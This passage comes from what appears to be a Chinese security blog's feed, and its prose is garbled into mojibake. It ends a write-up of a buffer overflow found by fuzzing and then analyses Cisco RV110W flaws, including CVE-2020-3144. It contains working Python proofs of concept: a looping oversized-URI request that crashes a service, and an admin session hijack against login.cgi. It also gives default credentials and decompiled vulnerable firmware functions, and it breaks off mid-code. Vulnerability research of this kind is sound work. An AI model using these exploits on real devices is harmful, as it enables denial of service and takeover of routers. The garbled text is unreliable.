<p>æ˜¾ç„¶å…¶ä¸­å¼•ç”¨äº†å¤šæ¬¡ lstrcpyA å‡½æ•°è¿›è¡Œå­—ç¬¦ä¸²æ‹·è´ï¼Œåœ¨æ‹·è´çš„æ—¶å€™ä¸è€ƒè™‘æºå­—ç¬¦ä¸²é•¿åº¦ï¼Œå½“ä¼ å…¥è¶…é•¿çš„å­—ç¬¦ä¸²ä¹‹åå°†å¯¼è‡´æº¢å‡ºã€‚ä¸è¿‡åœ¨é™æ€åˆ†æä¸‹æ— æ³•å®šä½åˆ°è°ä½¿ç”¨äº†è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥å¯é€šè¿‡è°ƒè¯•çœ‹çœ‹æ‰§è¡Œåˆ°è¿™é‡Œæ—¶å†…å­˜å¸ƒå±€æƒ…å†µã€‚</p>
<p>IDA å¯åŠ¨è°ƒè¯•ï¼Œåœ¨æ­¤å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œå½“æ‰§è¡Œåˆ°å´©æºƒä½ç½®æ—¶ lstrcpyA å‡½æ•°å‚æ•°å¦‚ä¸‹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/realinfo-6.png"
                     
                ></p>
<p>æºå­—ç¬¦ä¸²å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ payloadï¼Œç›®çš„å†…å­˜ä½äºæ ˆä¸­ï¼Œåœ°å€æ˜¯ 0018F3C0ï¼Œè¿›å…¥æ‹·è´å‡½æ•°ä¹‹åç”±äºæºå­—ç¬¦ä¸²è¶…é•¿ï¼Œç¼“å†²åŒºæŒ‡é’ˆå°†ä¸æ–­é€’å¢ï¼Œæœ€ç»ˆåˆ°è¾¾ 0x00190000 çš„ä¸å¯å†™å†…å­˜ï¼Œå¯¼è‡´ç¨‹åºå´©æºƒã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯å½“æç¤ºç¨‹åºåœæ­¢å·¥ä½œçš„æ—¶å€™ï¼Œé”™è¯¯æ¨¡å—æ˜¯ comctl32.dllï¼Œå®ƒæ˜¯åº”ç”¨ç¨‹åºå…±ç”¨ GUI åº“ï¼Œå½“å‘é€ä¸€ä¸ªè®¿é—®è¯·æ±‚ä¹‹åï¼Œç¨‹åºä¼šåœ¨çª—å£ä¸­å°†è®¿é—®çš„ URI æ˜¾ç¤ºå‡ºæ¥ï¼Œåœ¨æ˜¾ç¤ºçš„è¿‡ç¨‹ä¸­ç¼ºå°‘å¯¹ URI é•¿åº¦é™åˆ¶ï¼Œå¯èƒ½å¯¼è‡´åœ¨ç»˜åˆ¶ GUI çš„æ—¶å€™å‘ç”Ÿé”™è¯¯ã€‚</p>
<p>POC</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.136.130&quot;</span></span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;/&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">0x1000</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.get(burp0_url, headers=burp0_headers, timeout=<span class="number">3</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Success!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>



<h2 id=""><a href="#" class="headerlink" title="-"></a>-</h2><p>è¿™ä¸ªæ¼æ´æ¯”è¾ƒç®€å•ï¼Œç›®å‰æ¥çœ‹åªèƒ½é€ æˆæ‹’ç»æœåŠ¡ï¼Œæš‚æ—¶ä¸æ¸…æ¥šèƒ½å¦å¯¹æ§åˆ¶ç³»ç»Ÿäº§ç”Ÿå½±å“ï¼Œå¦å¤–åœ¨ä¸»ç¨‹åºå­˜åœ¨æ•°æ®ä¼ è¾“ç«¯å£ 1998ï¼Œæœ‰å¯èƒ½ä¹Ÿå­˜åœ¨ä¸€äº›é—®é¢˜ã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨äº†ç®€å•çš„ fuzz æŠ€å·§æ¥å‘ç°è¿™ä¸ªæ¼æ´ï¼Œfuzz çš„æ ¸å¿ƒå°±æ˜¯å®šä¹‰æ•°æ®æ ¼å¼é€‚é…ç›®æ ‡ç¨‹åºï¼Œå¦‚æœå¤§å®¶æœ‰æ›´å¥½çš„æ¨¡ç³Šæµ‹è¯•æ€è·¯æ¬¢è¿æ¥ä¿¡è®¨è®ºã€‚</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>Cisco RV110W æ•°ä¸ªæ¼æ´</title>
    <url>/2020/11/10/cisco-rv110w-bugs/</url>
    <content><![CDATA[<p><strong>è¯¥ç³»åˆ—è®¾å¤‡å·²ç»è¿›å…¥ EOL (End Of Life) é˜¶æ®µï¼Œå®˜æ–¹ä¸ä¼šé’ˆå¯¹æ¼æ´å‘å¸ƒå®‰å…¨æ›´æ–°ã€‚</strong></p>
<p><strong>å»ºè®®ç”¨æˆ·åŠæ—¶ä¸‹çº¿å¹¶æ›¿æ¢è¯¥ç³»åˆ—è®¾å¤‡ã€‚</strong></p>
<span id="more"></span>

<h2 id="CVE-2020-3144"><a href="#CVE-2020-3144" class="headerlink" title="CVE-2020-3144"></a>CVE-2020-3144</h2><h3 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><p>Cisco å®˜æ–¹å‘å¸ƒä¿¡æ¯ï¼š <a class="link"   href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-auth-bypass-cGv9EruZ" >https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-auth-bypass-cGv9EruZ<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>æ¼æ´è¯„åˆ†ï¼š9.8(<strong>Critical</strong>)</p>
<p>æ¼æ´æè¿°ï¼šæ­¤æ¼æ´ä½äº web ç®¡ç†ç•Œé¢ä¸­ï¼Œå½±å“ Cisco RV110Wï¼ŒRV130 ä»¥åŠ RV215W ç­‰è®¾å¤‡ã€‚ç”±äºå¯¹ session çš„ç®¡ç†å­˜åœ¨é—®é¢˜ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ç‰¹æ®Šæ ¼å¼çš„ HTTP è¯·æ±‚è§¦å‘æ¼æ´ï¼ŒæˆåŠŸçš„æ”»å‡»å¯ä»¥ä½¿æ”»å‡»è€…è·å–è®¾å¤‡çš„ç®¡ç†å‘˜æƒé™ã€‚</p>
<h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>æ­¤æ¼æ´åœ¨ 1.2.2.8 ç‰ˆæœ¬ä¸­è¿›è¡Œäº†ä¿®å¤ã€‚</p>
<p>å›ºä»¶ä¸‹è½½é“¾æ¥(è¯·ä¸‹è½½ 1.2.2.8 ä»¥ä¸‹ç‰ˆæœ¬)ï¼š<a class="link"   href="https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.8?catid=268437899" >https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.8?catid=268437899<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>binwalk å¯ä»¥é¡ºåˆ©çš„è§£å‹å›ºä»¶ï¼Œå¾—åˆ°ä¸€ä¸ªæ ‡å‡†çš„åµŒå…¥å¼ Linux æ–‡ä»¶ç³»ç»Ÿã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/rv110w-1.png"
                     
                ></p>
<p>æ¼æ´åœ¨å¤„ç† http è¯·æ±‚çš„æ–‡ä»¶ä¸­ï¼Œæ–‡ä»¶è·¯å¾„ï¼š&#x2F;usr&#x2F;sbin&#x2F;httpdã€‚å®ƒæ˜¯ä¸€ä¸ª MIPS32 å°ç«¯åºçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç›´æ¥ä½¿ç”¨ Ghidra æ‰“å¼€ã€‚</p>
<p>å…³é”®å‡½æ•°ä½äº log_in_cgi ä¸­ï¼Œæ­¤å‡½æ•°ä¸»è¦å®ç°ç”¨æˆ·ç™»å½•çš„é€»è¾‘ï¼Œå‡½æ•°ä»£ç ç¨é•¿ï¼Œå…³é”®éƒ¨åˆ†å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">enc = <span class="built_in">strcmp</span>(__s1_00,<span class="string">&quot;continue&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (enc == <span class="number">0</span>) &#123;</span><br><span class="line">  nvram_unset(<span class="string">&quot;tmp_auth_key&quot;</span>);</span><br><span class="line">  user = (undefined *)nvram_get(<span class="string">&quot;session_key&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (user == (undefined *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    user = &amp;DAT_00487eb0;</span><br><span class="line">  &#125;</span><br><span class="line">  set_key_status(user,<span class="string">&quot;drop&quot;</span>);</span><br><span class="line">  set_login_info(param_1,local_30);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>__s1_00 å˜é‡ç”± get_cgi å‡½æ•°è¿”å›</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">method = (char *)get_cgi(&quot;submit_type&quot;);</span><br></pre></td></tr></table></figure></div>

<p>ç»è¿‡æŠ“åŒ…å‘ç° get_cgi å‡½æ•°ç”¨äºè·å–ç”¨æˆ·å‘é€è¯·æ±‚ä¸­çš„å­—æ®µï¼Œsubmit_type æ˜¯ç”¨æˆ·æäº¤è¯·æ±‚çš„ç±»å‹ï¼Œç™»å½•çš„æ—¶å€™ä¸»è¦æœ‰ä¸¤ç§ç±»å‹ï¼Œä¸€æ˜¯ set_langï¼Œç”¨äºè®¾ç½®è¯­è¨€ï¼ŒäºŒæ˜¯ continueï¼Œè¿™æ˜¯æˆ‘ä»¬éœ€è¦å…³æ³¨çš„è¯·æ±‚ã€‚</p>
<p>é‚£ä¹ˆ continue æ˜¯ä»€ä¹ˆåŠŸèƒ½å‘¢ï¼Ÿå¦‚æœæœ‰è®¾å¤‡çš„è¯å°±å¾ˆå¥½éªŒè¯äº†ï¼Œæ‰“å¼€ web ç®¡ç†ç•Œé¢å¦‚ä¸‹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/rv110w-2.png"
                     
                ></p>
<p>æ­¤æ—¶å¯ä»¥æ­£å¸¸ç™»å½•ç®¡ç†å‘˜è´¦æˆ·(é»˜è®¤ç”¨æˆ·åå¯†ç ä¸º cisco:cisco)ï¼ŒæˆåŠŸç™»å½•åå¦‚æœæ²¡æœ‰ä¸»åŠ¨ç™»å‡ºï¼Œåªæ˜¯ç®€å•çš„å…³é—­äº†ç½‘é¡µï¼Œåå°çš„ç®¡ç†å‘˜è´¦æˆ·æ˜¯ä¸ä¼šè‡ªåŠ¨ç™»å‡ºçš„ï¼Œæ­¤æ—¶å†å‘èµ·ä¸€ä¸ªæ–°çš„ç™»å½•è¯·æ±‚ï¼Œä¼šçœ‹åˆ°å¦‚ä¸‹ç•Œé¢</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/rv110w-3.png"
                     
                ></p>
<p>å¼€å¯æŠ“åŒ…ï¼Œç‚¹å‡» continueï¼Œå¾—åˆ°è¯·æ±‚å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /login.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 129</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https://192.168.1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://192.168.1.1/login.cgi</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">submit_button=login&amp;submit_type=continue&amp;gui_action=gozila_cgi&amp;next_page=&amp;wait_time=0&amp;change_action=&amp;enc=1&amp;user=&amp;pwd=&amp;sel_lang=EN</span><br></pre></td></tr></table></figure></div>

<p>æ­¤æ—¶ submit_type å°±æ˜¯ continueï¼Œæ ¹æ®ä»£ç æ¥çœ‹ï¼Œå½“ç”¨æˆ·å‘é€äº† continue è¯·æ±‚çš„æ—¶å€™ï¼Œå¹¶ä¸”å½“å‰ nvram ä¸­çš„ session_key å­—æ®µä¸ä¸ºç©ºï¼Œå°±ç›´æ¥è®¾ç½®ç™»å½•ä¿¡æ¯ï¼Œä¸éªŒè¯ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶ä¸”è¿™ä¸ªè¯·æ±‚ä¸éœ€è¦èº«ä»½éªŒè¯ã€‚</p>
<p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬èƒ½åœ¨çœŸæ­£çš„ç®¡ç†å‘˜å‘èµ·ç™»å½•è¯·æ±‚å’Œ continue è¯·æ±‚ä¹‹é—´å‘é€ continue è¯·æ±‚ï¼Œå°±å¯ä»¥æˆªè·ç®¡ç†å‘˜çš„ session_idï¼Œä»è€Œè·å–åå°ç®¡ç†æƒé™ã€‚</p>
<p>æ­¤æ¼æ´çš„ POC å¦‚ä¸‹</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Code from https://quentinkaiser.be/exploitdev/2020/07/14/breaking-cisco-rv-again/</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;login&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit_type&quot;</span>:<span class="string">&quot;continue&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gui_action&quot;</span>:<span class="string">&quot;gozila_cgi&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.post(</span><br><span class="line">            <span class="string">&quot;https://192.168.1.1/login.cgi&quot;</span>,</span><br><span class="line">            data=payload,</span><br><span class="line">            verify=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Login Page&quot;</span> <span class="keyword">in</span> resp.content:</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sessionid = re.findall(<span class="string">r&quot;session_id=([^\&quot;]+)&quot;</span>, resp.content)[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Successfully hijacked admin session. Session id is</span></span><br><span class="line"><span class="string">            &#123;&#125;&quot;</span>.<span class="built_in">format</span>(sessionid))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><strong>æ³¨ï¼šsession_id å’Œç™»å½•è€…çš„ IP å…·æœ‰å¯¹åº”å…³ç³»ï¼Œä¾‹å¦‚ç®¡ç†å‘˜ä» ip ä¸º 192.168.1.100 çš„æœºå™¨ä¸Šç™»å½•äº†è·¯ç”±å™¨åå°ï¼Œæ”»å‡»è€…ä» ip ä¸º 192.168.1.101 çš„æœºå™¨ä¸Šè¿›è¡Œ session_id åŠ«æŒå¾—åˆ° session_idï¼Œä½†ç”±äº ip çš„ç»‘å®šå…³ç³»ï¼Œä»–å¹¶ä¸èƒ½ç›´æ¥ä»æœ¬æœºç™»å½•ã€‚</strong></p>
<h2 id="CVE-2020-3145-amp-CVE-2020-3146-amp-CVE-xxxx-xxxx"><a href="#CVE-2020-3145-amp-CVE-2020-3146-amp-CVE-xxxx-xxxx" class="headerlink" title="CVE-2020-3145 &amp; CVE-2020-3146 &amp; CVE-xxxx-xxxx"></a>CVE-2020-3145 &amp; CVE-2020-3146 &amp; CVE-xxxx-xxxx</h2><h3 id="åŸºæœ¬ä¿¡æ¯-1"><a href="#åŸºæœ¬ä¿¡æ¯-1" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><p>CVE-2020-3145 &amp; CVE-2020-3146 ä¸¤ä¸ªæ¼æ´å®˜æ–¹ä¿¡æ¯ï¼š <a class="link"   href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-m4FEEGWX" >https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-m4FEEGWX<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>ç”±äºè¿™äº›æ¼æ´éƒ½ä½äºåå°ï¼Œå®é™…åˆ©ç”¨ä»·å€¼ä¸å¤§ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»¥ä¸€ä¸ªä¸ºä¾‹åˆ†æã€‚</p>
<p>3145 å’Œ 3146 ä¸¤ä¸ªæ¼æ´çš„åˆ†æå¯ä»¥åœ¨<a class="link"   href="https://quentinkaiser.be/exploitdev/2020/07/14/breaking-cisco-rv-again/" >è¿™é‡Œ<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>æ‰¾åˆ°(æ„Ÿè°¢ä½œè€…)ï¼Œæˆ‘ä»¬è¦åˆ†æçš„æ˜¯ä¸€ä¸ªæ­¤å‰æ²¡æœ‰è¢«æŠ«éœ²çš„æ¼æ´ï¼Œå¹¶ä¸”åœ¨æœ€æ–°ç‰ˆä¸­ä¹Ÿå­˜åœ¨(1.2.2.8)ã€‚</p>
<h3 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>è¿™äº›åå°æ¼æ´æˆå› åŸºæœ¬ç›¸åŒï¼Œéƒ½æ˜¯å¯¹ç”¨æˆ·æäº¤çš„æ•°æ®éªŒè¯ä¸ä¸¥æ ¼å¯¼è‡´çš„ã€‚æˆ‘ä»¬åˆ†æçš„æ¼æ´ä½äºå‡½æ•° save_http_user (1.2.2.8)ï¼ŒGhidra å¯ä»¥ç›´æ¥è¿›è¡Œåç¼–è¯‘ï¼Œç»“æœå¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">undefined4 <span class="title function_">save_http_user</span><span class="params">(undefined4 param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  undefined4 uVar3;</span><br><span class="line">  <span class="type">char</span> *__s;</span><br><span class="line">  undefined4 *__s1;</span><br><span class="line">  undefined4 *__s1_00;</span><br><span class="line">  undefined1 *puVar4;</span><br><span class="line">  <span class="type">int</span> iVar5;</span><br><span class="line">  undefined local_c8;</span><br><span class="line">  undefined auStack199 [<span class="number">49</span>];</span><br><span class="line">  undefined auStack150 [<span class="number">50</span>];</span><br><span class="line">  undefined auStack100 [<span class="number">52</span>];</span><br><span class="line">  undefined4 local_30;</span><br><span class="line">  undefined4 local_2c;</span><br><span class="line">  </span><br><span class="line">  __s1_00 = (undefined4 *)get_cgi(<span class="string">&quot;enadmin&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (__s1_00 == (undefined4 *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    __s1_00 = &amp;DAT_0047c3f8;</span><br><span class="line">  &#125;</span><br><span class="line">  __s1 = (undefined4 *)get_cgi(<span class="string">&quot;enguest&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (__s1 == (undefined4 *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    __s1 = &amp;DAT_0047c3f8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;local_c8,<span class="number">0</span>,<span class="number">0x96</span>);</span><br><span class="line">  local_c8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(auStack199,<span class="number">0</span>,<span class="number">0x31</span>);</span><br><span class="line">  puVar4 = (undefined1 *)get_cgi(<span class="string">&quot;en_guest&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (puVar4 == (undefined1 *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    puVar4 = &amp;DAT_00486160;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>((<span class="type">char</span> *)__s1_00,<span class="string">&quot;on&quot;</span>);</span><br><span class="line">  iVar5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    local_2c = get_cgi(<span class="string">&quot;admin_name&quot;</span>);</span><br><span class="line">    uVar2 = get_cgi(<span class="string">&quot;admin_old_pwd&quot;</span>);</span><br><span class="line">    uVar3 = get_cgi(<span class="string">&quot;admin_new_pwd&quot;</span>);</span><br><span class="line">    __s = (<span class="type">char</span> *)nvram_get(<span class="string">&quot;http_user0&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (__s == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      __s = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sscanf</span>(__s,<span class="string">&quot;%[^,],%[^,],%[^\n]&quot;</span>,&amp;local_c8,auStack150,auStack100);</span><br><span class="line">    iVar5 = setpwd(<span class="number">0</span>,local_2c,auStack150,uVar2,uVar3,&amp;local_c8);</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>((<span class="type">char</span> *)__s1,<span class="string">&quot;on&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    guest_name = get_cgi(<span class="string">&quot;guest_name&quot;</span>);</span><br><span class="line">    uVar2 = get_cgi(<span class="string">&quot;guest_old_pwd&quot;</span>);</span><br><span class="line">    uVar3 = get_cgi(<span class="string">&quot;guest_new_pwd&quot;</span>);</span><br><span class="line">    __s = (<span class="type">char</span> *)nvram_get(<span class="string">&quot;http_user1&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (__s == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      __s = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sscanf</span>(__s,<span class="string">&quot;%[^,],%[^,],%[^\n]&quot;</span>,&amp;local_c8,auStack150,auStack100);</span><br><span class="line">    iVar1 = setpwd(<span class="number">1</span>,guest_name,auStack150,uVar2,uVar3,&amp;local_c8);</span><br><span class="line">    iVar5 = iVar5 + iVar1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (iVar5 == <span class="number">0</span>) &#123;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>((<span class="type">char</span> *)__s1_00,<span class="string">&quot;on&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      logout(param_1);</span><br><span class="line">    &#125;</span><br><span class="line">    nvram_set(<span class="string">&quot;en_guest&quot;</span>,puVar4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    nvram_set(<span class="string">&quot;en_guest&quot;</span>,puVar4);</span><br><span class="line">    error_value = <span class="number">0xffffffff</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> error_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªåŠŸèƒ½æ˜¯ç”¨äºå¼€å¯è·¯ç”±å™¨çš„è®¿å®¢è´¦æˆ·ï¼Œå¼€å¯ä¹‹åè®¿å®¢ä¹Ÿå¯ä»¥ç™»å½•è·¯ç”±å™¨è¿›è¡Œä¸€å®šçš„ç®¡ç†ï¼Œæœ‰åˆ©äºç®¡ç†è§’è‰²çš„åˆ†å‰²ã€‚</p>
<p>ç¬¬ 56 è¡Œä¹‹å‰çš„ä»£ç å¤šæ¬¡ä½¿ç”¨ get_cgi å‡½æ•°è·å–ç”¨æˆ·æäº¤è¯·æ±‚ä¸­çš„æ•°æ®ï¼Œç¬¬ 58 è¡Œè°ƒç”¨äº† setpwd å‡½æ•°è®¾ç½®è®¿å®¢ç”¨æˆ·çš„å¯†ç ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯ guest_nameï¼Œå³ç”¨æˆ·æäº¤çš„è®¿å®¢ç”¨æˆ·åã€‚</p>
<p>setpwd å‡½æ•°çš„ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">uint <span class="title function_">setpwd</span><span class="params">(undefined4 param_1,undefined4 guest_name,<span class="type">char</span> *param_3,<span class="type">char</span> *param_4,undefined4param_5,</span></span><br><span class="line"><span class="params">           undefined4 param_6)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined4 local_128;</span><br><span class="line">  undefined4 local_124;</span><br><span class="line">  undefined4 local_120;</span><br><span class="line">  undefined4 local_11c;</span><br><span class="line">  undefined4 local_118;</span><br><span class="line">  undefined4 local_114;</span><br><span class="line">  undefined4 local_110;</span><br><span class="line">  undefined4 local_10c;</span><br><span class="line">  undefined4 local_108;</span><br><span class="line">  undefined4 local_104;</span><br><span class="line">  undefined4 local_100;</span><br><span class="line">  undefined4 local_fc;</span><br><span class="line">  undefined4 local_f8;</span><br><span class="line">  undefined4 local_f4;</span><br><span class="line">  undefined4 local_f0;</span><br><span class="line">  undefined2 local_ec;</span><br><span class="line">  <span class="type">char</span> acStack234 [<span class="number">202</span>];</span><br><span class="line">  </span><br><span class="line">  local_11c = <span class="number">0</span>;</span><br><span class="line">  local_118 = <span class="number">0</span>;</span><br><span class="line">  local_114 = <span class="number">0</span>;</span><br><span class="line">  local_110 = <span class="number">0</span>;</span><br><span class="line">  local_10c = <span class="number">0</span>;</span><br><span class="line">  local_108 = <span class="number">0</span>;</span><br><span class="line">  local_104 = <span class="number">0</span>;</span><br><span class="line">  local_100 = <span class="number">0</span>;</span><br><span class="line">  local_fc = <span class="number">0</span>;</span><br><span class="line">  local_f8 = <span class="number">0</span>;</span><br><span class="line">  local_f4 = <span class="number">0</span>;</span><br><span class="line">  local_f0 = <span class="number">0</span>;</span><br><span class="line">  local_ec = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(acStack234,<span class="number">0</span>,<span class="number">200</span>);</span><br><span class="line">  local_120 = <span class="number">0x585872</span>;</span><br><span class="line">  local_128 = <span class="number">0x70747468</span>;</span><br><span class="line">  local_124 = <span class="number">0x6573755f</span>;</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="type">char</span> *)&amp;local_128,<span class="number">0xc</span>,<span 